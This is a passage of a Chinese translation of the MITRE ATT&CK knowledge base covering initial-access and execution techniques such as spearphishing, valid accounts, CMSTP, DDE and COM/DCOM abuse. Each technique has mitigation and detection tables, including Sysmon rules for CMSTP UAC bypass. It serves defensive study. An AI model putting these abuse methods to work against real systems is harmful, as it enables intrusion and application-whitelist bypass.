- 如果应用程序托管在基于云的基础架构上，利用这一点可能会导致底层受到损害。这可以让攻击者获得访问 **云API** 或利用弱身份和访问管理策略

#### 防御方式

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|应用程序隔离将限制被利用的目标对其他进程和系统功能的访问
**Exp防护**|**WAF** 可用于限制应用程序的暴露
**网络隔离**|使用 **DMZ** 或在独立的托管基础设施，将面向外部的服务器和服务与网络的其他部分分离
**账号权限控制**|最小化特权
**软件更新**|确保应用保持最新
**更新软件**|定期扫描外部系统的漏洞，并建立程序以在通过扫描和公开披露发现重大漏洞时快速修补系统

#### 检测手段

- 监视应用程序日志中是否有异常行为
- **DPI** 检测
- **WAF**

***

### External Remote Services (外部远程服务)

>[原文链接](https://attack.mitre.org/techniques/T1133/)

VPN，Citrix 和其他访问机制等远程服务使用户可以从外部位置连接到内部企业网络资源。经常有远程服务网关管理这些服务的连接和凭据身份验证。[**Windows 远程管理**](#windows-remote-management-windows-%e8%bf%9c%e7%a8%8b%e7%ae%a1%e7%90%86) 等服务也可以在外部使用。

- 攻击者可以通过远程服务进行初始入侵 **和/或** 在网络中持久化
- 访问有效账户对于该服务是必须的，可以通过篡改和在入侵企业网络后获取

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|禁用或阻止可能不必要的远程可用服务
**网络资源访问控制**|通过集中管理的集中器 (例如VPN) 和其他托管的远程访问系统，限制对远程服务的访问
**多因素认证**|对远程服务帐户使用强大的两因素或多因素身份验证
**网络隔离**|通过使用网络代理，网关和防火墙来拒绝对内部系统的直接远程访问

#### 检测手段

- 检测恶意使用有效账户对远程服务进行认证
- 收集身份验证日志并分析异常访问模式，以及正常工作时间之外的访问

***

### Hardware Additions (物理渗透硬件)

>[原文链接](https://attack.mitre.org/techniques/T1200/)

计算机附件、计算机或网络硬件可以作为获得执行的载体引入系统。 虽然 APT 组织使用的公共的很少，但是许多渗透测试人员利用物理渗透硬件来获得初始访问。 商业和开源产品利用了被动网络访问 、中间人破解 、击键注入 、通过DMA读取内核内存、向现有网络 添加新的无线访问等功能。

#### 防御方式

防御方式|描述
:--:|:--
**网络资源访问控制**|建立网络访问控制策略，如使用设备证书和 802.1x 标准。 将DHCP的使用限制在已注册的设备上，以防止未注册的设备与可信系统通信
**限制硬件安装*|通过终端安全配置和监视代理拦截未知设备和附件

#### 检测手段

资产管理系统可以帮助检测不应存在于网络中的计算机系统或网络设备。 终端传感器可以通过 **USB**、**Thunderbolt** 和其他外部设备通信端口检测添加的硬件。

***

### Replication Through Removable Media (通过可移动媒介复制)

>[原文链接](http://vulhub.org.cn/attack/techniques/T1091.md)

攻击者可以通过将恶意软件复制到可移动媒介上，利用媒体插入系统并执行的自动运行特性，转移到系统，这些系统处于未连通或气隙网络上。在 [**横向移动**](#lateral-movement-%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8) 中，可以修改可移动媒介中的可执行文件，或者复制恶意软件并将其重命名，使其看起来像合法文件，从而诱使用户在独立的系统上执行它。对于 [**初始访问**](#initial-access-%e5%88%9d%e5%a7%8b%e8%ae%bf%e9%97%ae) ，可以通过手动操作媒体、修改用于初始格式化媒体的系统或修改媒体本身的固件来实现。

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|如果不需要，可以禁用 **autorun**；如果业务操作不需要可移动媒介，则在组织策略级别上禁止或限制它
**限制硬件安装*|限制在网络中使用 USB 设备和可移动媒介

#### 检测手段

- 监视可移动媒介上的文件访问
- 检测在可移动媒介被挂载或由用户启动后执行的进程

***

### Spearphishing Attachment (鱼叉式钓鱼附件)

>[原文链接](https://attack.mitre.org/techniques/T1192/)

鱼叉式钓鱼附件是鱼叉式网络钓鱼的一种特殊变体,鱼叉附件使用了 **附加到电子邮件的恶意软件**。所有形式的鱼叉式钓鱼都是以电子方式提供的针对特定个人，公司或行业的社会工程学。在此情况下，攻击者将文件附加到钓鱼邮件中，并且依赖 [**用户执行**](#user-execution-%e7%94%a8%e6%88%b7%e6%89%a7%e8%a1%8c)。

#### 防御方式

防御方式|描述
:--:|:--
**杀毒软件**|防病毒软件可以自动隔离可疑文件
**网络入侵防护**|网络入侵防御系统以及旨在扫描和删除恶意电子邮件附件的系统可以用来阻止活动
**Web内容限制**|默认情况下，阻止不应该通过电子邮件传输的未知或未使用的附件是最佳做法，以防止某些媒介
**用户培训**|可以培训用户识别社交工程技术和电子邮件伪装

#### 检测手段

网络入侵检测系统和电子邮件网关可用于检测带有恶意附件的鱼叉式网络钓鱼。 **引爆设计 (detonation chambers)** 也可用于识别恶意附件。解决方案可以是基于签名和行为的，但是攻击者可能以某种方式构造附件来避免这些机制。

杀毒软件在扫描存储在电子邮件服务器或用户计算机上的文件时，可能会检测到恶意文档和附件。 终端检测或网络检测可以在打开附件(例如 Microsoft Word 文档或 PDF 文件，可以连接到 internet 或生成 Powershell) 时潜在地检测恶意事件，这些事件与客户端执行和脚本的漏洞利用等技术有关。

***

### Spearphishing Link (鱼叉式钓鱼链接)

>[原文链接](https://attack.mitre.org/techniques/T1192/)

鱼叉式钓鱼链接是鱼叉式钓鱼的一种特殊变体，区别在于他是用 **链接下载电子邮件的恶意软件**，也依赖于 [**用户执行**](#user-execution-%e7%94%a8%e6%88%b7%e6%89%a7%e8%a1%8c)。连接还可以定位到意在 [**窃取应用程序访问令牌**](#access-token-manipulation-%e6%93%8d%e4%bd%9c%e8%ae%bf%e9%97%ae%e4%bb%a4%e7%89%8c) 的恶意程序

#### 防御方式

防御方式|描述
:--:|:--
**Web内容限制**|确定某些可用于造假网站的网站对于业务运营是否必要，并在无法很好地监控活动或构成重大风险的情况下考虑阻止访问
**用户培训**|可以培训用户识别社交工程技术和电子邮件伪装

#### 检测手段

检查电子邮件中的 **URL** 有助于检测指向已知恶意站点的链接。 **引爆设计 (detonation chambers)** 可用于检测这些链接，并自动转到这些站点以确定它们是否具有潜在恶意，或在等待用户访问链接时捕获内容。 这种技术通常涉及终端上的用户交互，因此一旦用户执行，就可能检测到鱼叉式钓鱼链接。

***

### Spearphishing via Service (服务式鱼叉钓鱼)

>[原文链接](http://vulhub.org.cn/attack/techniques/T1194.md)

服务式鱼叉钓鱼是鱼叉式钓鱼的一种特殊变体，区别在于他采用的是 **第三方服务** 。

攻击者将创建虚假的社交媒体帐户，并向员工传达潜在的工作机会。这样做可以提出合理的理由来询问环境中运行的服务，策略和软件。然后，攻击者可以通过这些服务发送恶意链接或附件。

#### 防御方式

防御方式|描述
:--:|:--
**杀毒软件**|防病毒软件可以自动隔离可疑文件
**Web内容限制**|确定第三方服务对于企业的运营是否必要，不必要可以考虑阻止访问
**用户培训**|实行安全培训

#### 检测手段

由于用于 **服务式鱼叉钓鱼** 的大多数常见第三方服务利用 TLS 加密，因此通常需要 **SSL/TLS** 检查来检测初始通信/交付。 利用 **SSL/TLS** 检查入侵检测签名或其他安全网关设备可能能够检测到恶意软件。 杀毒软件可以检测用户电脑上下载的恶意文档和文件。 终端检测或网络检测可以在打开文件  (例如 Microsoft Word 文档或 PDF 文件，可以连接到 internet 或生成 Powershell.exe) 时潜在地检测恶意事件，这些事件与客户端执行和脚本的漏洞利用等技术有关。

***

### Supply Chain Compromise (供应链攻击)

>[原文链接](https://attack.mitre.org/techniques/T1195/)

供应链攻击是为了最终数据或系统折衷目的而在最终消费者收到产品或产品交付机制之前对其进行的操纵。

供应链攻击可以发生在供应链的任何阶段，包括：

- 开发工具的操作
- 开发环境的操作
- 源代码库的操作
- **软件更新**/分发机制
- 受损/感染的系统映像
- 用修改的版本替换合法软件
- 向合法分销商销售修改/仿冒产品

尽管供应链的攻击可能会影响硬件或软件的任意组件，但想要获得执行的攻击者往往关注在软件分发阶段或更新渠道中对合法软件进行的恶意添加。 可以以特定的受害者群体为目标， 或将恶意软件分发给广泛的消费者群体，但仅对特定受害者的附加策略。

#### 防御方式

防御方式|描述
:--:|:--
**更新软件**|应该实施补丁程序管理过程
**漏洞扫描**|漏洞源的持续监视以及使用自动和手动代码检查工具

#### 检测手段

通过 **哈希校验** 或其他完整性校验机制来检验分布式二进制文件。扫描下载的文件查找是否有恶意签名，并尝试在部署之前测试软件和更新，同时注意潜在的可疑活动。对硬件进行物理检查以查找潜在的篡改。

***

### Trusted Relationship (受信关系)

>[原文链接](https://attack.mitre.org/techniques/T1199/)

攻击者可能会破坏或利用能够接触到目标受害者的组织。通过可信的第三方关系利用现有的连接，这些连接可能不受保护或者受到的审查比获取网络访问权的标准机制少。组织通常授予第二或第三方外部提供商高级访问权限，以允许它们管理内部系统。这些关系的例子包括IT服务承包商、托管安全供应商、基础设施承包商(例如HVAC、电梯、物理安全)。 第三方提供商的访问权可能被限制在所维护的基础结构内，但是可能与企业的其他部分在相同的网络中。这样，另一方用于访问内部网络系统的 [**合法账户**](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7) 可能会遭到破坏和使用

#### 防御方式

防御方式|描述
:--:|:--
**网络隔离**|网络分割隔离无需广泛网络访问的基础设施组件
**用户帐号控制**|妥善管理可受信关系中各方使用的帐户和权限

#### 检测手段

建立对由第二方和第三方提供商以及其他受信任实体进行的活动的监视。根据关系的类型，攻击可能在执行操作之前可以访问有关目标的大量信息，尤其是在信任的关系基于IT服务的情况下。攻击者可能能够快速地朝着目标行事，因此对与凭据访问，横向移动和收集有关的行为进行适当的监视对于检测入侵至关重要。

***

### Valid Accounts (合法账号)

>[原文链接](https://attack.mitre.org/techniques/T1078/)

攻击者可以使用凭据访问技术窃取特定用户或服务帐户的凭据，或者在侦察过程的早期通过社会工程来获取凭据以获得初始访问权限。

攻击者可能使用的帐户可以分为三类：默认帐户，本地帐户和域帐户。

被盗取的凭证可用于绕过网络内系统上的各种资源的访问控制，甚至可能用于对远程系统和外部可用服务的持久化。被盗取的凭证可能还会给攻击者提供特定系统或网络受限区域的特权。攻击者可能选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，使其更难被察觉。

默认帐户也不仅限于客户端计算机上的访客和管理员，还包括为设备(例如网络设备和计算机应用程序)而预先设置的帐户，无论它们是内部，开放源代码还是COTS。预先设置了用户名和密码的设备会对在安装后不进行更改的使用者构成严重威胁，它们很容易成为攻击者的目标。同样，攻击者也可以利用公开披露的私钥或被盗的私钥通过 [**远程服务**](#remote-services-%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1) 合法地连接到远程环境。

帐户访问权，凭据和权限在整个系统网络中的重叠是令人关注的，因为攻击者可能能够跨帐户和系统打到高访问级别(即域或企业管理员)，从而绕过企业内部访问控制。

#### 防御方式

防御方式|描述
:--:|:--
**应用程序开发人员指南**|确保应用程序不会不安全地存储敏感数据或凭据。(例如，代码中的纯文本凭据，存储库中已发布的凭据或公共云存储中的凭据)
**用户帐号控制**|妥善管理可受信关系中各方使用的帐户和权限
**流量过滤**|考虑在基于云的系统上将IP白名单与用户帐户管理一起使用
**多因素认证**|将多因素身份验证 (MFA) 集成为组织策略的一部分可以极大地降低g攻击者获得对有效凭据的控制的风险
**密码策略**|在安装后和部署到生产环境之前，应立即更改使用默认用户名和密码的应用程序和设备
**账户权限控制**|例行审核域和本地帐户及其权限级别，还应包括是否启用了默认帐户，或者是否创建了未经授权的新本地帐户
**用户帐号管理**|通过身份和访问管理 (IAM) 控件，确保用户和用户组对其角色具有适当的权限

#### 检测手段

- 在整个企业和外部可访问的服务配置健壮，一致的帐户活动审核策略
- 在共享帐户(用户，管理员或服务帐户)的系统中查找可疑帐户行为
- 对域和本地系统帐户进行​​定期审核

***

## Execution (执行)

>[攻击者试图运行恶意代码](https://attack.mitre.org/tactics/TA0002/)

**执行** 是指攻击者控制的代码在本地或者远程系统上运行，通常恶意代码通常与所有其他策略结合使用，以达成更大的目标。

***

### AppleScript (AppleScript)

>[原文链接](https://attack.mitre.org/techniques/T1155/)

**macOS** 和 **OS X** 的应用互相发送 **AppleEvent** 消息以实现进程间通信 (IPC)。**AppleScript** 可以轻松编写本地或远程IPC的通信消息。Osascript 执行 **AppleScript** 和任何其他开放脚本编写体系结构 (OSA) 语言脚本。可以使用 **osalang** 程序找到安装在系统上的 **OSA** 语言列表

攻击者可以使用它与打开的SSH连接进行交互，移至远程计算机，甚至向用户显示虚假对话框。这些事件无法远程启动应用程序 (尽管它们可以在本地启动它们)，但是如果它们已经在远程运行，则可以与应用程序进行交互。由于这是一种脚本语言，因此它也可以用于启动更通用的技术，例如通过 python 反弹 shell 。脚本可以通过 `osascript /path/to/script` 或从命令行运行 `osascript -e "script here"`。

#### 防御方式

防御方式|描述
:--:|:--
**代码签名**|要求所有 AppleScript 在执行之前都要由受信任的开发人员 ID 签名，这将阻止随机的 AppleScript 代码执行

#### 检测手段

通过 **osascript** 监视 **AppleScript** 的执行，该脚本可能与系统上发生的其他可疑行为有关。

***

### CMSTP (CMSTP-Microsoft连接管理器配置文件安装程序)

>[原文链接](https://attack.mitre.org/techniques/T1191/)  
>[相关链接](https://www.freebuf.com/articles/system/172515.html)

Microsoft 连接管理器配置文件安装程序 (**CMSTP.exe**) 是用于安装连接管理器服务配置文件的命令行程序。**CMSTP.exe** 接受安装信息文件 (INF) 作为参数，并安装用于远程访问连接的服务配置文件。

攻击者可能向 **CMSTP.exe** 提供了感染了恶意命令的INF文件。与 [**Regsvr32**](#regsvr32-regsvr32) / [**Squiblydoo**](http://dy.163.com/v2/article/detail/EAT3L8I70511CJ6O.html) 类似，攻击者可能滥用 **CMSTP.exe** 从远程服务器 **加载和执行 DLL**  **和/或**  **COM脚本**。由于 **CMSTP.exe** 是合法的、Microsoft 签名的应用程序，因此该执行过程也可以**绕过 AppLocker** 和其他白名单防御。

**CMSTP.exe** 还可能被滥用于绕过用户帐户控制，并通过自动提升的COM接口执行来自恶意 **INF** 的任意命令。

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|在给定的环境中，**CMSTP.exe** 可能不是必需的 (除非用于 VPN 连接安装)
**预防执行**|如果给定系统或网络不需要 **CMSTP.exe**，可以考虑使用配置为阻止**CMSTP.exe** 执行的应用程序白名单

#### 检测手段

使用进程监视来检测和分析 **CMSTP.exe** 的执行和参数。 将 **CMSTP.exe** 最近调用与之前的已知良好参数和被加载的文件进行比较，以确定异常和潜在的攻击活动。

还可以使用 Sysmon 事件识别 **CMSTP.exe** 的潜在滥用。 检测策略可能取决于特定的攻击者程序，但可能的规则包括：

- 检测本地/远程负载加载执行：
    `Event 1 (Process creation) :ParentImage` 包含 **CMSTP.exe**
    `Event 3 (Network connection) :Image` 包含 **CMSTP.exe** 且源IP为外部IP
- 检测利用自动提升的COM进程绕过UAC：
    `Event 10 (ProcessAccess) :CallTrace` 包含 CMLUA.dll
    `Event 12 or 13 (RegistryEvent) :TargetObject` 包含 CMMGR32.exe
    监视事件，如进程创建 (Sysmon Event 1), 涉及自动提升的 CMSTP COM 窗口 比如 `CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7)` ，`CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F)`

***

### Command-Line Interface (命令行界面)

>[原文链接](https://attack.mitre.org/techniques/T1059/)

命令行界面提供了一种与计算机系统交互的方式，许多操作系统平台都有该功能。其在 Windows 系统上的一个例子就是 **cmd**，它可以用来执行许多任务，包括执行其他软件。命令行界面可以在本地交互，也可以通过远程桌面应用程序、反弹 shell 等进行远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令包含更改该执行的权限上下文的进程调用 (例如，[**计划任务**](#scheduled-task-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1))。

攻击者可以使用命令行界面与系统交互，并在操作过程中执行其他软件。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|通过使用应用程序白名单工具来审核 **和/或** 阻止不必要的命令行

#### 检测手段

可以通过用命令行参数适当记录进程执行来捕获命令行界面活动。这些信息可以帮助他们通过攻击者使用本机进程或自定义工具的方式更多地了解攻击者行为。

***

### Compiled HTML File (.chm文件)

>[原文链接](https://attack.mitre.org/techniques/T1223/)

编译的HTML文件 (.chm文件) 通常作为 Microsoft HTML 帮助系统的一部分分发。**CHM** 文件是各种内容(如 HTML 文档、图像)和编程语言相关的脚本/web(如 VBA、JScript、Java 和 ActiveX) 的压缩编译。 **CHM** 内容使用由 HTML 帮助可执行程序 **(hh.exe)** 加载的 Internet Explorer 浏览器的底层组件显示。

攻击者可能会滥用该技术来隐藏恶意代码。包含嵌入式有效负载的自定义 .chm文件 可以传递给受害者，然后由 [**用户执行**](#user-execution-%e7%94%a8%e6%88%b7%e6%89%a7%e8%a1%8c) 触发。**.chm** 执行还可以绕过较旧 **和/或** 未打补丁的系统上的应用白名单，这些系统没有考虑通过 **hh.exe** 执行二进制文件。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|如果给定的系统或网络不需要 hh.exe，还可以考虑使用应用程序白名单来阻止 hh.exe 执行，防止潜在的攻击者滥用
**Web内容限制**|考虑阻止已知在攻击活动中使用的可能不常见的文件类型的下载/传输和执行，比如 .chm 文件

#### 检测手段

- 监视和分析 **hh.exe** 的执行和参数。 将 **hh.exe** 最近的调用与先前已知良好参数的调用进行比较，以确定异常和潜在的攻击活动
- 非标准进程执行树也可能表明可疑或恶意行为，例如 **hh.exe** 是与其他攻击技术相关的可疑进程和活动的父进程。
- 监视 **CHM文件** 的存在和使用，特别是如果它们在环境中不按照典型的方式使用

***

### Component Object Model and Distributed COM (COM & DCOM)

>[原文链接](https://attack.mitre.org/techniques/T1175/)

攻击者可以使用 COM 和 DCOM 在本地代码执行，或是作为 [**横向移动**](#lateral-movement-%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8) 的一部分，让代码远程执行。

COM是本机Windows应用程序编程接口 (API) 的组件，该组件支持软件对象之间的交互，或者实现一个或多个接口的可执行代码。通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库 (DLL) 或可执行文件 (EXE) 。 DCOM是透明的中间件，使用远程过程调用 (RPC) 技术将组件对象模型 (COM) 的功能扩展到本地计算机之外。

与本地和远程服务器COM对象进行交互的权限由注册表中的访问控制列表 (ACL) 指定。默认情况下，只有管理员可以通过DCOM远程激活和启动COM对象。

攻击者可能滥用 **COM** 来执行本地命令 **和/或**  payload。各种 **COM** 接口被爆出可通过各种编程语言 (例如C，C ++，Java和VBScript) 滥用以调用任意执行。还存在特定的 **COM** 对象，它们可以直接执行代码执行之外的功能，例如 创建 [**计划任务**](#scheduled-task-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1) ，**无文件下载/执行** 以及其他攻击性行为，例如 [**提权**](#privilege-escalation-%e6%8f%90%e6%9d%83) 和 [**持久化**](#persistence-%e6%8c%81%e4%b9%85%e5%8c%96)。

攻击者可以使用 **DCOM** 进行横向移动。 通过 **DCOM** ，在具有适当特权的用户上下文中操作的攻击者可以通过 Office 应用程序 以及其他包含不安全方法的 Windows 对象远程实现任意执行甚至直接执行 shellcode。 **DCOM** 还可以在现有文档 中执行宏，也可以直接通过 COM 创建的 Microsoft Office 应用程序实例调用 [**动态数据交换**](#dynamic-data-exchange-%e5%8a%a8%e6%80%81%e6%95%b0%e6%8d%ae%e4%ba%a4%e6%8d%a2%e5%8d%8f%e8%ae%ae) ，从而不需要恶意文档。

#### 防御方式

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|确保已启用所有 **COM** 警报和受保护的视图
功能禁用|考虑通过 `Dcomcnfg.exe` 禁用 **DCOM**
**网络隔离**|启用Windows防火墙，默认情况下会阻止 DCOM 实例化
**账号权限控制**|修改注册表设置 (直接或使用 `Dcomcnfg.exe`)`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{{AppID_GUID}}`与单个 **COM** 应用程序的整个进程的安全性相关联。
**账号权限控制**|修改注册表设置 (直接或使用 `Dcomcnfg.exe`) `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole` ，与所有未设置自己的进程范围安全性的 **COM** 应用程序的系统范围安全性默认值关联

#### 检测手段

- 监视 **COM** 对象加载的 **DLL** 和通常与应用程序无关的其他模块。通过 [**查询注册表**](#query-registry-%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%86%8c%e8%a1%a8) 或 [**PowerShell**](#powershell-powershell) 枚举 **COM** 对象也可能会继续恶意使用
- 监视与 **COM**对象关联的进程的产生
- 监视分布式计算环境/远程过程调用 **(DCE / RPC)** 的异常流量

***

### Control Panel Items (控制面板项)

>[原文链接](https://attack.mitre.org/techniques/T1196/)

Windows控制面板项允许用户查看和调整计算机设置。控制面板项是已注册的可执行文件 (.exe) 或控制面板文件 (.cpl)，实际上后者已经被重命名为动态链接库文件 (.dll)，他可以到处 CPIApplet 函数。控制面板项可以直接从命令行执行，也可以通过应用程序编程接口 (API) 调用以编程方式执行，或者只需双击文件。

为了易用性，控制面板项通常包括用户友好的图形菜单，在控制面板被注册加载后。

攻击者可以使用控制面板项作为 payload 来执行任意命令。恶意控制面板项可以通过以 [**鱼叉式钓鱼附件**](#spearphishing-attachment-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%99%84%e4%bb%b6) 的方式传递或作为多级恶意软件的一部分执行。控制面板项，特别是 CPL 文件，也可以绕过应用程序 **和/或** 文件扩展名白名单。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|使用应用程序白名单工具，来识别和阻止潜在的恶意和未知.cpl文件
**限制文件和目录权限**|将控制面板项的存储和执行限制为受保护的目录

#### 检测手段

- 监视和分析与CPL文件相关的项目相关的活动
- 清单控制面板项，用于查找系统中未注册和潜在的恶意文件
  - 可执行格式注册控制面板项将具有全局唯一标识符 **(GUID)** 和在注册的注册表项`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace` 和 `HKEY_CLASSES_ROOT\CLSID{{GUID}}`这些条目可能包含有关控制面板项的信息，如其显示名称、本地文件的路径以及在控制面板中打开时执行的命令。
  - 存储在System32目录中的CPL格式注册的控制面板项目将自动显示在控制面板中。其他控制面板项目将在`Cpls`和`Extended Properties`注册表项中具有注册条目`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel`。这些条目可能包括诸如GUID，本地文件的路径以及用于以编程方式( `WinExec("c:\windows\system32\control.exe {{Canonical_Name}}", SW_NORMAL);`)或从命令行(`control.exe /name {{Canonical_Name}}`)启动文件的规范名称之类的信息
  - 某些控制面板项目可通过注册的Shell扩展名进行扩展，`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder{{name}}\Shellex\PropertySheetHandlers`,其中{{name}}是系统项目的预定义名称。
- 分析新的控制面板项以及磁盘以查找恶意内容。 可执行文件和 CPL 格式都是兼容的可移植可执行文件 **(PE)** 映像，直到反逆向之前，都可以使用传统的工具和方法进行检查

***

### Dynamic Data Exchange (动态数据交换协议)

>[原文链接](https://attack.mitre.org/techniques/T1173/)

**DDE** 是一种用于应用程序之间的单次 **和/或** 连续进程间通信 (IPC) 客户端-服务器协议。一旦建立连接，应用程序就可以自主的交换由字符串、[温数据链接](https://blog.csdn.net/Scrat_Kong/article/details/86618907) (数据项更改时的通知)、[热数据链接](https://blog.csdn.net/Scrat_Kong/article/details/86618907) (数据项更改的副本) 以及命令执行请求组成的事务。

对象链接和嵌入 **(OLE)** 或在文档之间链接数据的功能最初是通过 **DDE** 实现的。尽管已被 **COM** 取代，但可以通过注册表项在Windows 10和大多数Microsoft Office 2016中启用DDE。

攻击者可以使用 DDE 执行任意命令。Microsoft Office 文档可以通过 **DDE** 命令 直接或通过嵌入式文件 被污染，并用于通过钓鱼活动或托管 Web 内容交付执行，避免使用 Visual Basic for Applications (VBA) 宏。在没有命令行执行权限的受感染计算机上，攻击者也可以利用 **DDE**。

#### 防御方式

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|确保已启用**受保护的视图**
**终端行为防护**|在 Windows 10 上，启用 **攻击面减少 (ASR)** 规则，以防止 **DDE攻击** 和从 Office 程序生成子进程
**功能禁用**|可以将 Microsoft Office 功能控制安全性对应的注册表项设置为禁用 **DDE/OLE** 自动执行。 Microsoft 还创建了注册表项，以完全禁用 Word 和 Excel 中的 **DDE** 执行
**软件配置**|确保已启用 **受保护的视图** 并考虑禁用未在 **受保护的视图**中注册的 Office 程序 (如 OneNote)中的嵌入文件

#### 检测手段

- 可以扫描 **OLE** 和 Office Open XML 文件中的 **DDEAUTO**、**DDE** 和其他表明 DDE 执行的字符串
- 监视 Microsoft Office 应用程序加载 DLL 和通常与应用程序无关的其他模块
- 监视从 Microsoft Office 应用程序生成的异常进程 (如 cmd.exe)

***

### Execution through API (通过API执行)

>[原文链接](https://attack.mitre.org/techniques/T1106/)

攻击者工具可以直接使用 Windows 应用程序编程接口 (API) 来执行二进制文件。诸如 Windows API CreateProcess 这样的函数将允许程序和脚本使用适当的路径和参数启动其他进程。

例如：

```C++
CreateProcessA() & CreateProcessW()
CreateProcessAsUserA() & CreateProcessAsUserW()
CreateProcessInternalA() & CreateProcessInternalW()
CreateProcessWithLogonW() & CreateProcessWithTokenW()
LoadLibraryA() & LoadLibraryW()
LoadLibraryExA() & LoadLibraryExW()
LoadModule()
LoadPackagedLibrary()
WinExec()
ShellExecuteA() & ShellExecuteW()
ShellExecuteExA() & ShellExecuteExW()
```

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|使用适当的应用程序白名单工具，识别并阻止可能通过此技术执行的潜在恶意软件

#### 检测手段

监视 **API** 调用可能会生成大量数据，除非在特定情况下收集，否则可能无法直接用于防御，因为良性使用 Windows API 函数 (如 CreateProcess) 很常见，难以与恶意行为区分开来。使用 **API** 监控将其他事件与有关 **API** 函数调用的行为关联起来，**API** 监控将其他事件与有关 **API** 函数调用的行为关联起来，这为确定事件是否是恶意行为造成的提供了额外的上下文。按 **进程族** 和 **进程 ID** 对活动进行关联即可。

***

### Execution through Module Load (通过模块加载执行)

>[原文链接](https://attack.mitre.org/techniques/T1129/)

**Windows模块加载程序** 可以通过任意本地路径和任意通用命名规则 (UNC) 网络路径加载DLL。此功能保留在 **NTDLL.dll** 中，并且是 **Windows原生API**，可以通过 **Win32 API** 的 **CreateProcess()** 等调用。

模块加载DLL的方法：

- 通过制定在 **IMPORT** 目录中的 (绝对或相对) 路径名
- 通过 **EXPORT** 转发到另一个 **DLL**，该 **DLL** 具有 (绝对或相对) 路径名 (但不带扩展名)
- 通过 **NTFS** 联结或符号链接 `program.exe.local` 与包含 **IMPORT** 或转发的 EXPORTs 的目录中指定的 DLL 的 (绝对或相对) 路径名
- 通过 `<file name="filename.extension" loadFrom="fully-qualified or relative pathname"\>` 嵌入或外部的 **application manifest**。文件名是指 IMPORT 目录中的条目或转发的 EXPORT

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|使用适当的应用程序白名单工具，识别并阻止可能通过此技术执行的潜在恶意软件

#### 检测手段

合法软件一般只需要加载例程，绑定的 **DLL** 模块或 Windows 系统 **DLL** ，因此加载非已知的模块可能是可疑的。 将 **DLL** 模块加载限制在 `%SystemRoot%` 和 `%ProgramFiles%` 目录，可以防止来自不安全路径的模块加载。 **API** 监视到的模块加载有关的行为的其他事件和写入磁盘的可疑 **DLL** ，为事件提供额外的上下文有所联系，这有助于确定是否是由于恶意行为。

***

### Exploitation for Client Execution (客户端执行的利用)

>[原文链接](https://attack.mitre.org/techniques/T1203/)

软件可能因为不安全的开发导致了漏洞，攻击者可以通过针对性的 **exp** 来利用漏洞，执行恶意代码。通常，对攻击者最有用的 **exp** 是那些能在他人系统执行恶意代码的，有以下几种利用。

#### 基于浏览器的利用

浏览器是 [**路过式威胁**](#drive-by-compromise-%e8%b7%af%e8%bf%87%e5%bc%8f%e5%a8%81%e8%83%81) 和 [**鱼叉式钓鱼链接**](#spearphishing-link-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%93%be%e6%8e%a5) 的常见目标。系统可能在正常的浏览时受到攻击或受到恶意用户的攻击，他们通常将恶意电子邮件中的链接定位到攻击者搭建的恶意网站，不需要任何操作就可以执行 **exp**。

#### 办公应用

常见的办公软件，例如 (Microsoft Office) 也是 **鱼叉攻击 ([鱼叉式钓鱼附件](#spearphishing-attachment-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%99%84%e4%bb%b6)，[鱼叉式钓鱼链接](#spearphishing-link-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%93%be%e6%8e%a5)，[服务式鱼叉钓鱼](#spearphishing-via-service-%e6%9c%8d%e5%8a%a1%e5%bc%8f%e9%b1%bc%e5%8f%89%e9%92%93%e9%b1%bc))** 的目标。恶意文件将作为附件或下载链接的形式直接下载。 用户需要打开文档或文件才能执行 **exp**。

#### 常见第三方应用

在网络中部署的一些其他的应用程序也可以漏洞利用，例如 **Adobe Reader** 和 **Flash** 之类的应用 (企业中常见的应用) 也是攻击者的目标，是否需要浏览器或者用户打开它来执行，取决于软件与漏洞的性质。

#### 防御方式

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|浏览器沙箱可用于减轻某些利用的影响，但是，**沙箱逃逸**可能存在。其他类型的虚拟化和应用程序微分段 (microsegmentation) 也可以减轻客户端漏洞利用的影响
**Exp防护**|查找漏洞利用过程中的行为的安全应用程序,可用于缓解某些漏洞利用行为。控制流完整性校验是另一种可能识别和拦截软件漏洞利用的方法

#### 检测手段

